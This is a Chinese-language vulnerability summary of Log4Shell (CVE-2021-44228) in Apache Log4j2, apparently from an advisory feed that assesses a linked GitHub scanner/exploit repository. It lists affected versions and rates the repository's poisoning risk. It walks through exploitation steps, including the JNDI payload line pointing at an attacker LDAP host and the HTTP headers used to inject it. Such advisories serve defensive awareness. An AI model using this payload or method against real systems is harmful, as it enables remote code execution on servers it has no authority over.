## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)